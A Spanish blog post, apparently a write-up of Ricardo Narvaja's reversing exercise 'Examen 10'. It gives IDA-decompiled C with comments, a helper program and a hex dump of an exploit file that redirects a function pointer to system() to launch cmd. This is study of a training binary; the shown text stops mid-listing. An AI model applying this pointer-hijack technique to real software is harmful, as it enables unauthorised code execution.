<!DOCTYPE html>
<html lang="es">





<head>
  <meta property="og:url" content="https://imlauera.github.io/post/buffer_overflow_10/">
  <meta property="og:site_name" content="Imlauer">
  <meta property="og:title" content="Ricardo Narvaja: Examen 10 (Ejecutar calculadora no es un bufferoverflow)">
  <meta property="og:description" content="No me funcionaba con wine en linux porque verifica si argc == 2 y si ejecutás wine EXAMEN_10.exe 49 el argc vale 3, así que tuve que ejecutar el exploit en windows. En linux en vez de usar calc uso cmd porque calc no está disponible a nivel global.
El código que me generó el ida con algunas modificaciones
_DWORD *__thiscall this_106(_DWORD *this) { this[106] = &#34;A ejecutar la calculadora de nuevo...\n&#34;; return this; } int __cdecl check2(char *Destination) { strcat(Destination, *(Destination &#43; 106)); // Tenemos que hacer que la longitud de Destination valga 56 ya tenemos 38 bytes de la cadena &#34;A ejecutar la calculadora de nuevo...\n&#34; y ahora tenemos que hacer que Destination tenga 18. 18&#43;38=56. // Para lograr eso tenemos que agregar un 0 en la posición 18 porque strcpy copia hasta donde hay un 0. // Voy a ejecutar cmd porque wine no tiene calc.exe if ( strlen(Destination) == 56 ) { if ( Destination[4] == &#39;I&#39; ) (*(Destination &#43; 52))(Destination &#43; 254); if ( Destination[4] == &#39;P&#39; ) (*(Destination &#43; 53))(Destination &#43; 254); if ( Destination[4] == &#39;Q&#39; ) // Este queremos que se ejecute porque en Destination[54] está el puntero a system y Destination[254] es igual a Buffer[30] // Esto es lo mismo que system(Buffer[30]) (*(Destination &#43; 54))(Destination &#43; 254); if ( Destination[4] == &#39;R&#39; ) (*(Destination &#43; 55))(Destination &#43; 254); } return 0; } int __cdecl check(char *Destination, int a2) { // Acá le resta &#39;1&#39; al puntero a system, vamos a ver que significa 1 en hexa. // 1 en hexadecimal = 31 // Entonces tenemos que hacer que v12 valga 49, no sé bien por qué // system&#43;49-&#39;1&#39; = system Destination[54] = a2 - &#39;1&#39;; check2(Destination); return 0; } int __cdecl main(int argc, const char **argv, const char **envp) { char Destination[204]; // [esp&#43;0h] [ebp-1B4h] BYREF FILE *Stream; // [esp&#43;CCh] [ebp-E8h] int (*imprimir)(const char *const, ...); // [esp&#43;D0h] [ebp-E4h] int (*v7)(const char *const, ...); // [esp&#43;D4h] [ebp-E0h] int (*v8)(const char *const, ...); // [esp&#43;D8h] [ebp-DCh] int (*v9)(const char *const, ...); // [esp&#43;DCh] [ebp-D8h] char Buffer[200]; // [esp&#43;E0h] [ebp-D4h] BYREF const char *v11; // [esp&#43;1A8h] [ebp-Ch] int v12; // [esp&#43;1ACh] [ebp-8h] int v13; // [esp&#43;1B0h] [ebp-4h] this_106(Destination); imprimir = printf; v7 = printf; v8 = printf; v9 = printf; printf(v11); v13 = printf; memset(Buffer, 0, sizeof(Buffer)); memset(Destination, 0, 200u); // Carga el contenido del archivo en Stream Stream = fopen(&#34;example.txt&#34;, &#34;rb&#34;); if ( !Stream ) { imprimir(&#34;No se puede leer el archivo bye bye \n&#34;); exit(1); } // De stream copia 200 bytes a Buffer fread(Buffer, 200u, 1u, Stream); // De buffer lo copia a Destination strcpy(Destination, Buffer); // Si hay un argumentos if ( argc == 2 ) { // Transforma a entero el 2do argumento // v12 tiene que valer 31 entonces. v12 = atoi(argv[1]); // Acá suma el puntero a system con v12, no necesitamos v12 sólo queremos el puntero a system. // v13 = system &#43; 49 v13 = system &#43; v12; } check(Destination, v13); imprimir(&#34;\n&#34;); // Buffer[30] = Destination[254] imprimir(&amp;Buffer[30]); return 0; } Con este código me dí cuenta que tenía que pasarle 49 como argumento: #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; int main(int argc, char *argv[]){ // a = 61 // 1 = 31 printf(&#34;atoi(%s): %d\n&#34;,argv[1],atoi(argv[1])); printf (&#34;argc: %d\n&#34;,argc); char a = &#39;a&#39; - &#39;1&#39; &#43; atoi(argv[1]); printf(&#34;a = 61, 1 = 31\n&#34;); printf(&#34;&#39;%c&#39;-&#39;1&#39;&#43;atoi(%s): %x\n&#34;,&#39;a&#39;,argv[1],a); return 0; } Exploit 00000000: 5151 5151 5151 5151 5151 5151 5151 5151 QQQQQQQQQQQQQQQQ 00000010: 5100 5151 5151 5151 5151 5151 5151 636d Q.QQQQQQQQQQQQcm 00000020: 64 d Es muy parecido al otro sólo que verifica la cantidad de argumentos y tiene un puntero a system que le resta ‘1’ en char y tenés que sumarle 49 para recuperar la dirección del puntero a system.">
  <meta property="og:locale" content="es_es">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2024-08-26T15:52:16-03:00">
    <meta property="article:modified_time" content="2024-08-26T15:52:16-03:00">
    <meta property="article:tag" content="Reversing">
    <meta property="article:tag" content="Ricardo">
    <meta property="article:tag" content="Narvaja">
    <meta property="article:tag" content="Examen">
    <meta property="article:tag" content="Ida">

  
  <meta itemprop="name" content="Ricardo Narvaja: Examen 10 (Ejecutar calculadora no es un bufferoverflow)">
  <meta itemprop="description" content="No me funcionaba con wine en linux porque verifica si argc == 2 y si ejecutás wine EXAMEN_10.exe 49 el argc vale 3, así que tuve que ejecutar el exploit en windows. En linux en vez de usar calc uso cmd porque calc no está disponible a nivel global.
El código que me generó el ida con algunas modificaciones
_DWORD *__thiscall this_106(_DWORD *this) { this[106] = &#34;A ejecutar la calculadora de nuevo...\n&#34;; return this; } int __cdecl check2(char *Destination) { strcat(Destination, *(Destination &#43; 106)); // Tenemos que hacer que la longitud de Destination valga 56 ya tenemos 38 bytes de la cadena &#34;A ejecutar la calculadora de nuevo...\n&#34; y ahora tenemos que hacer que Destination tenga 18. 18&#43;38=56. // Para lograr eso tenemos que agregar un 0 en la posición 18 porque strcpy copia hasta donde hay un 0. // Voy a ejecutar cmd porque wine no tiene calc.exe if ( strlen(Destination) == 56 ) { if ( Destination[4] == &#39;I&#39; ) (*(Destination &#43; 52))(Destination &#43; 254); if ( Destination[4] == &#39;P&#39; ) (*(Destination &#43; 53))(Destination &#43; 254); if ( Destination[4] == &#39;Q&#39; ) // Este queremos que se ejecute porque en Destination[54] está el puntero a system y Destination[254] es igual a Buffer[30] // Esto es lo mismo que system(Buffer[30]) (*(Destination &#43; 54))(Destination &#43; 254); if ( Destination[4] == &#39;R&#39; ) (*(Destination &#43; 55))(Destination &#43; 254); } return 0; } int __cdecl check(char *Destination, int a2) { // Acá le resta &#39;1&#39; al puntero a system, vamos a ver que significa 1 en hexa. // 1 en hexadecimal = 31 // Entonces tenemos que hacer que v12 valga 49, no sé bien por qué // system&#43;49-&#39;1&#39; = system Destination[54] = a2 - &#39;1&#39;; check2(Destination); return 0; } int __cdecl main(int argc, const char **argv, const char **envp) { char Destination[204]; // [esp&#43;0h] [ebp-1B4h] BYREF FILE *Stream; // [esp&#43;CCh] [ebp-E8h] int (*imprimir)(const char *const, ...); // [esp&#43;D0h] [ebp-E4h] int (*v7)(const char *const, ...); // [esp&#43;D4h] [ebp-E0h] int (*v8)(const char *const, ...); // [esp&#43;D8h] [ebp-DCh] int (*v9)(const char *const, ...); // [esp&#43;DCh] [ebp-D8h] char Buffer[200]; // [esp&#43;E0h] [ebp-D4h] BYREF const char *v11; // [esp&#43;1A8h] [ebp-Ch] int v12; // [esp&#43;1ACh] [ebp-8h] int v13; // [esp&#43;1B0h] [ebp-4h] this_106(Destination); imprimir = printf; v7 = printf; v8 = printf; v9 = printf; printf(v11); v13 = printf; memset(Buffer, 0, sizeof(Buffer)); memset(Destination, 0, 200u); // Carga el contenido del archivo en Stream Stream = fopen(&#34;example.txt&#34;, &#34;rb&#34;); if ( !Stream ) { imprimir(&#34;No se puede leer el archivo bye bye \n&#34;); exit(1); } // De stream copia 200 bytes a Buffer fread(Buffer, 200u, 1u, Stream); // De buffer lo copia a Destination strcpy(Destination, Buffer); // Si hay un argumentos if ( argc == 2 ) { // Transforma a entero el 2do argumento // v12 tiene que valer 31 entonces. v12 = atoi(argv[1]); // Acá suma el puntero a system con v12, no necesitamos v12 sólo queremos el puntero a system. // v13 = system &#43; 49 v13 = system &#43; v12; } check(Destination, v13); imprimir(&#34;\n&#34;); // Buffer[30] = Destination[254] imprimir(&amp;Buffer[30]); return 0; } Con este código me dí cuenta que tenía que pasarle 49 como argumento: #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; int main(int argc, char *argv[]){ // a = 61 // 1 = 31 printf(&#34;atoi(%s): %d\n&#34;,argv[1],atoi(argv[1])); printf (&#34;argc: %d\n&#34;,argc); char a = &#39;a&#39; - &#39;1&#39; &#43; atoi(argv[1]); printf(&#34;a = 61, 1 = 31\n&#34;); printf(&#34;&#39;%c&#39;-&#39;1&#39;&#43;atoi(%s): %x\n&#34;,&#39;a&#39;,argv[1],a); return 0; } Exploit 00000000: 5151 5151 5151 5151 5151 5151 5151 5151 QQQQQQQQQQQQQQQQ 00000010: 5100 5151 5151 5151 5151 5151 5151 636d Q.QQQQQQQQQQQQcm 00000020: 64 d Es muy parecido al otro sólo que verifica la cantidad de argumentos y tiene un puntero a system que le resta ‘1’ en char y tenés que sumarle 49 para recuperar la dirección del puntero a system.">
  <meta itemprop="datePublished" content="2024-08-26T15:52:16-03:00">
  <meta itemprop="dateModified" content="2024-08-26T15:52:16-03:00">
  <meta itemprop="wordCount" content="623">
  <meta itemprop="keywords" content="Reversing,Ricardo,Narvaja,Examen,Ida">
  
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Ricardo Narvaja: Examen 10 (Ejecutar calculadora no es un bufferoverflow)">
  <meta name="twitter:description" content="No me funcionaba con wine en linux porque verifica si argc == 2 y si ejecutás wine EXAMEN_10.exe 49 el argc vale 3, así que tuve que ejecutar el exploit en windows. En linux en vez de usar calc uso cmd porque calc no está disponible a nivel global.
El código que me generó el ida con algunas modificaciones
_DWORD *__thiscall this_106(_DWORD *this) { this[106] = &#34;A ejecutar la calculadora de nuevo...\n&#34;; return this; } int __cdecl check2(char *Destination) { strcat(Destination, *(Destination &#43; 106)); // Tenemos que hacer que la longitud de Destination valga 56 ya tenemos 38 bytes de la cadena &#34;A ejecutar la calculadora de nuevo...\n&#34; y ahora tenemos que hacer que Destination tenga 18. 18&#43;38=56. // Para lograr eso tenemos que agregar un 0 en la posición 18 porque strcpy copia hasta donde hay un 0. // Voy a ejecutar cmd porque wine no tiene calc.exe if ( strlen(Destination) == 56 ) { if ( Destination[4] == &#39;I&#39; ) (*(Destination &#43; 52))(Destination &#43; 254); if ( Destination[4] == &#39;P&#39; ) (*(Destination &#43; 53))(Destination &#43; 254); if ( Destination[4] == &#39;Q&#39; ) // Este queremos que se ejecute porque en Destination[54] está el puntero a system y Destination[254] es igual a Buffer[30] // Esto es lo mismo que system(Buffer[30]) (*(Destination &#43; 54))(Destination &#43; 254); if ( Destination[4] == &#39;R&#39; ) (*(Destination &#43; 55))(Destination &#43; 254); } return 0; } int __cdecl check(char *Destination, int a2) { // Acá le resta &#39;1&#39; al puntero a system, vamos a ver que significa 1 en hexa. // 1 en hexadecimal = 31 // Entonces tenemos que hacer que v12 valga 49, no sé bien por qué // system&#43;49-&#39;1&#39; = system Destination[54] = a2 - &#39;1&#39;; check2(Destination); return 0; } int __cdecl main(int argc, const char **argv, const char **envp) { char Destination[204]; // [esp&#43;0h] [ebp-1B4h] BYREF FILE *Stream; // [esp&#43;CCh] [ebp-E8h] int (*imprimir)(const char *const, ...); // [esp&#43;D0h] [ebp-E4h] int (*v7)(const char *const, ...); // [esp&#43;D4h] [ebp-E0h] int (*v8)(const char *const, ...); // [esp&#43;D8h] [ebp-DCh] int (*v9)(const char *const, ...); // [esp&#43;DCh] [ebp-D8h] char Buffer[200]; // [esp&#43;E0h] [ebp-D4h] BYREF const char *v11; // [esp&#43;1A8h] [ebp-Ch] int v12; // [esp&#43;1ACh] [ebp-8h] int v13; // [esp&#43;1B0h] [ebp-4h] this_106(Destination); imprimir = printf; v7 = printf; v8 = printf; v9 = printf; printf(v11); v13 = printf; memset(Buffer, 0, sizeof(Buffer)); memset(Destination, 0, 200u); // Carga el contenido del archivo en Stream Stream = fopen(&#34;example.txt&#34;, &#34;rb&#34;); if ( !Stream ) { imprimir(&#34;No se puede leer el archivo bye bye \n&#34;); exit(1); } // De stream copia 200 bytes a Buffer fread(Buffer, 200u, 1u, Stream); // De buffer lo copia a Destination strcpy(Destination, Buffer); // Si hay un argumentos if ( argc == 2 ) { // Transforma a entero el 2do argumento // v12 tiene que valer 31 entonces. v12 = atoi(argv[1]); // Acá suma el puntero a system con v12, no necesitamos v12 sólo queremos el puntero a system. // v13 = system &#43; 49 v13 = system &#43; v12; } check(Destination, v13); imprimir(&#34;\n&#34;); // Buffer[30] = Destination[254] imprimir(&amp;Buffer[30]); return 0; } Con este código me dí cuenta que tenía que pasarle 49 como argumento: #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; int main(int argc, char *argv[]){ // a = 61 // 1 = 31 printf(&#34;atoi(%s): %d\n&#34;,argv[1],atoi(argv[1])); printf (&#34;argc: %d\n&#34;,argc); char a = &#39;a&#39; - &#39;1&#39; &#43; atoi(argv[1]); printf(&#34;a = 61, 1 = 31\n&#34;); printf(&#34;&#39;%c&#39;-&#39;1&#39;&#43;atoi(%s): %x\n&#34;,&#39;a&#39;,argv[1],a); return 0; } Exploit 00000000: 5151 5151 5151 5151 5151 5151 5151 5151 QQQQQQQQQQQQQQQQ 00000010: 5100 5151 5151 5151 5151 5151 5151 636d Q.QQQQQQQQQQQQcm 00000020: 64 d Es muy parecido al otro sólo que verifica la cantidad de argumentos y tiene un puntero a system que le resta ‘1’ en char y tenés que sumarle 49 para recuperar la dirección del puntero a system.">

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>
    
    Ricardo Narvaja: Examen 10 (Ejecutar calculadora no es un bufferoverflow)
    
  </title>
  <link rel="stylesheet" href='https://imlauera.github.io/css/site.min.css'>
  <link rel="canonical" href="https://imlauera.github.io/post/buffer_overflow_10/">
  <link rel="alternate" type="application/rss&#43;xml" href="https://imlauera.github.io/index.xml" title="Imlauer">
  <meta http-equiv="X-UA-Compatible" content="chrome=1">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="referrer" content="no-referrer">
  <meta name="author" content="Imlauer.">
  <meta name="description" content="No me funcionaba con wine en linux porque verifica si argc == 2 y si ejecutás wine EXAMEN_10.exe 49 el argc vale 3, así que tuve que ejecutar el exploit en windows. En linux en vez de usar calc uso cmd porque calc no está disponible a nivel global.
El código que me generó el ida con algunas modificaciones

_DWORD *__thiscall this_106(_DWORD *this)
{
  this[106] = &#34;A ejecutar la calculadora de nuevo...\n&#34;;
  return this;
}

int __cdecl check2(char *Destination)
{
  strcat(Destination, *(Destination &#43; 106));
  //  Tenemos que hacer que la longitud de Destination valga 56 ya tenemos 38 bytes de la cadena &#34;A ejecutar la calculadora de nuevo...\n&#34; y ahora tenemos que hacer que Destination tenga 18. 18&#43;38=56.
  // Para lograr eso tenemos que agregar un 0 en la posición 18 porque strcpy copia hasta donde hay un 0.

  // Voy a ejecutar cmd porque wine no tiene calc.exe
  if ( strlen(Destination) == 56 )
  {
    if ( Destination[4] == &#39;I&#39; )
      (*(Destination &#43; 52))(Destination &#43; 254);
    if ( Destination[4] == &#39;P&#39; )
      (*(Destination &#43; 53))(Destination &#43; 254);
    if ( Destination[4] == &#39;Q&#39; )
      // Este queremos que se ejecute porque en Destination[54] está el puntero a system y Destination[254] es igual a Buffer[30]

      // Esto es lo mismo que system(Buffer[30])
      (*(Destination &#43; 54))(Destination &#43; 254);

    if ( Destination[4] == &#39;R&#39; )
      (*(Destination &#43; 55))(Destination &#43; 254);
  }
  return 0;
}

int __cdecl check(char *Destination, int a2)
{
  // Acá le resta &#39;1&#39; al puntero a system, vamos a ver que significa 1 en hexa.
  // 1 en hexadecimal = 31
  // Entonces tenemos que hacer que v12 valga 49, no sé bien por qué 
  // system&#43;49-&#39;1&#39; = system
  Destination[54] = a2 - &#39;1&#39;;
  check2(Destination);
  return 0;
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char Destination[204]; // [esp&#43;0h] [ebp-1B4h] BYREF
  FILE *Stream; // [esp&#43;CCh] [ebp-E8h]
  int (*imprimir)(const char *const, ...); // [esp&#43;D0h] [ebp-E4h]
  int (*v7)(const char *const, ...); // [esp&#43;D4h] [ebp-E0h]
  int (*v8)(const char *const, ...); // [esp&#43;D8h] [ebp-DCh]
  int (*v9)(const char *const, ...); // [esp&#43;DCh] [ebp-D8h]
  char Buffer[200]; // [esp&#43;E0h] [ebp-D4h] BYREF
  const char *v11; // [esp&#43;1A8h] [ebp-Ch]
  int v12; // [esp&#43;1ACh] [ebp-8h]
  int v13; // [esp&#43;1B0h] [ebp-4h]

  this_106(Destination);
  imprimir = printf;
  v7 = printf;
  v8 = printf;
  v9 = printf;
  printf(v11);
  v13 = printf;
  memset(Buffer, 0, sizeof(Buffer));
  memset(Destination, 0, 200u);
  // Carga el contenido del archivo en Stream
  Stream = fopen(&#34;example.txt&#34;, &#34;rb&#34;);
  if ( !Stream )
  {
    imprimir(&#34;No se puede leer el archivo bye bye \n&#34;);
    exit(1);
  }
  // De stream copia 200 bytes a Buffer
  fread(Buffer, 200u, 1u, Stream);
  // De buffer lo copia a Destination
  strcpy(Destination, Buffer);
  // Si hay un argumentos
  if ( argc == 2 )
  {
    // Transforma a entero el 2do argumento
    // v12 tiene que valer 31 entonces.
    v12 = atoi(argv[1]);
    // Acá suma el puntero a system con v12, no necesitamos v12 sólo queremos el puntero a system.
    // v13 = system &#43; 49
    v13 = system &#43; v12;
  }
  check(Destination, v13);
  imprimir(&#34;\n&#34;);
  // Buffer[30] = Destination[254]
  imprimir(&amp;Buffer[30]);
  return 0;
}
Con este código me dí cuenta que tenía que pasarle 49 como argumento:

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

int main(int argc, char *argv[]){

	// a = 61
	// 1 = 31
	printf(&#34;atoi(%s): %d\n&#34;,argv[1],atoi(argv[1]));

	printf (&#34;argc: %d\n&#34;,argc);
	char a = &#39;a&#39; - &#39;1&#39; &#43; atoi(argv[1]);

	printf(&#34;a = 61, 1 = 31\n&#34;);
	printf(&#34;&#39;%c&#39;-&#39;1&#39;&#43;atoi(%s): %x\n&#34;,&#39;a&#39;,argv[1],a);
	return 0;
}
Exploit
00000000: 5151 5151 5151 5151 5151 5151 5151 5151  QQQQQQQQQQQQQQQQ
00000010: 5100 5151 5151 5151 5151 5151 5151 636d  Q.QQQQQQQQQQQQcm
00000020: 64                                       d
Es muy parecido al otro sólo que verifica la cantidad de argumentos y tiene un puntero a system que le resta &lsquo;1&rsquo; en char y tenés que sumarle 49 para recuperar la dirección del puntero a system.">
</head>
<body><nav class="navbar is-transparent " role="navigation" aria-label="main navigation">
  <div class="navbar-brand">
    <a class="navbar-item" href="https://imlauera.github.io/">
      <figure class="image">
        <img alt="" class="is-rounded" src="/img/memememe.jpg">
      </figure>
    </a>
    <a class="navbar-item" href="https://imlauera.github.io/">
      Imlauer
    </a>
    <a class="navbar-item" href="/acerca/">
      Acerca de Mi
    </a>
  </div>
  
  
</nav>

  <section>
    <section class='hero is-small is-link is-fullwidth'>
      <div class="hero-body">
<div class="container">
  <h1 class="title">
    Ricardo Narvaja: Examen 10 (Ejecutar calculadora no es un bufferoverflow)
  </h1>
  <h2 class="subtitle">
    <time datetime='2024-08-26T15:52:16-03:00'>
      August 26, 2024
    </time>
    
    <br>
    
    
    
    <a class="tag is-info" href="https://imlauera.github.io/tags/reversing/">Reversing</a>
    
    
    
    
    <a class="tag is-info" href="https://imlauera.github.io/tags/ricardo/">Ricardo</a>
    
    
    
    
    <a class="tag is-info" href="https://imlauera.github.io/tags/narvaja/">Narvaja</a>
    
    
    
    
    <a class="tag is-info" href="https://imlauera.github.io/tags/examen/">Examen</a>
    
    
    
    
    <a class="tag is-info" href="https://imlauera.github.io/tags/ida/">Ida</a>
    
    
    
  </h2>
</div>

      </div>
    </section>
    <section class="section">
      <div class="container">
<div class="content is-medium">
  <p>No me funcionaba con wine en linux porque verifica si argc == 2 y si ejecutás <code>wine EXAMEN_10.exe 49</code> el argc vale 3, así que tuve que ejecutar el exploit en windows. En linux en vez de usar calc uso cmd porque calc no está disponible a nivel global.</p>
<p>El código que me generó el ida con algunas modificaciones</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>_DWORD <span style="color:#f92672">*</span>__thiscall <span style="color:#a6e22e">this_106</span>(_DWORD <span style="color:#f92672">*</span>this)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  this[<span style="color:#ae81ff">106</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A ejecutar la calculadora de nuevo...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> this;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">check2</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>Destination)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">strcat</span>(Destination, <span style="color:#f92672">*</span>(Destination <span style="color:#f92672">+</span> <span style="color:#ae81ff">106</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//  Tenemos que hacer que la longitud de Destination valga 56 ya tenemos 38 bytes de la cadena &#34;A ejecutar la calculadora de nuevo...\n&#34; y ahora tenemos que hacer que Destination tenga 18. 18+38=56.
</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Para lograr eso tenemos que agregar un 0 en la posición 18 porque strcpy copia hasta donde hay un 0.
</span></span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Voy a ejecutar cmd porque wine no tiene calc.exe
</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strlen</span>(Destination) <span style="color:#f92672">==</span> <span style="color:#ae81ff">56</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( Destination[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;I&#39;</span> )
</span></span><span style="display:flex;"><span>      (<span style="color:#f92672">*</span>(Destination <span style="color:#f92672">+</span> <span style="color:#ae81ff">52</span>))(Destination <span style="color:#f92672">+</span> <span style="color:#ae81ff">254</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( Destination[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;P&#39;</span> )
</span></span><span style="display:flex;"><span>      (<span style="color:#f92672">*</span>(Destination <span style="color:#f92672">+</span> <span style="color:#ae81ff">53</span>))(Destination <span style="color:#f92672">+</span> <span style="color:#ae81ff">254</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( Destination[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Q&#39;</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Este queremos que se ejecute porque en Destination[54] está el puntero a system y Destination[254] es igual a Buffer[30]
</span></span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Esto es lo mismo que system(Buffer[30])
</span></span></span><span style="display:flex;"><span>      (<span style="color:#f92672">*</span>(Destination <span style="color:#f92672">+</span> <span style="color:#ae81ff">54</span>))(Destination <span style="color:#f92672">+</span> <span style="color:#ae81ff">254</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( Destination[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;R&#39;</span> )
</span></span><span style="display:flex;"><span>      (<span style="color:#f92672">*</span>(Destination <span style="color:#f92672">+</span> <span style="color:#ae81ff">55</span>))(Destination <span style="color:#f92672">+</span> <span style="color:#ae81ff">254</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">check</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>Destination, <span style="color:#66d9ef">int</span> a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Acá le resta &#39;1&#39; al puntero a system, vamos a ver que significa 1 en hexa.
</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 1 en hexadecimal = 31
</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Entonces tenemos que hacer que v12 valga 49, no sé bien por qué 
</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">// system+49-&#39;1&#39; = system
</span></span></span><span style="display:flex;"><span>  Destination[<span style="color:#ae81ff">54</span>] <span style="color:#f92672">=</span> a2 <span style="color:#f92672">-</span> <span style="color:#e6db74">&#39;1&#39;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">check2</span>(Destination);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> Destination[<span style="color:#ae81ff">204</span>]; <span style="color:#75715e">// [esp+0h] [ebp-1B4h] BYREF
</span></span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>Stream; <span style="color:#75715e">// [esp+CCh] [ebp-E8h]
</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>imprimir)(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">const</span>, ...); <span style="color:#75715e">// [esp+D0h] [ebp-E4h]
</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>v7)(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">const</span>, ...); <span style="color:#75715e">// [esp+D4h] [ebp-E0h]
</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>v8)(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">const</span>, ...); <span style="color:#75715e">// [esp+D8h] [ebp-DCh]
</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>v9)(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">const</span>, ...); <span style="color:#75715e">// [esp+DCh] [ebp-D8h]
</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> Buffer[<span style="color:#ae81ff">200</span>]; <span style="color:#75715e">// [esp+E0h] [ebp-D4h] BYREF
</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v11; <span style="color:#75715e">// [esp+1A8h] [ebp-Ch]
</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v12; <span style="color:#75715e">// [esp+1ACh] [ebp-8h]
</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v13; <span style="color:#75715e">// [esp+1B0h] [ebp-4h]
</span></span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">this_106</span>(Destination);
</span></span><span style="display:flex;"><span>  imprimir <span style="color:#f92672">=</span> printf;
</span></span><span style="display:flex;"><span>  v7 <span style="color:#f92672">=</span> printf;
</span></span><span style="display:flex;"><span>  v8 <span style="color:#f92672">=</span> printf;
</span></span><span style="display:flex;"><span>  v9 <span style="color:#f92672">=</span> printf;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(v11);
</span></span><span style="display:flex;"><span>  v13 <span style="color:#f92672">=</span> printf;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(Buffer, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(Buffer));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(Destination, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">200u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Carga el contenido del archivo en Stream
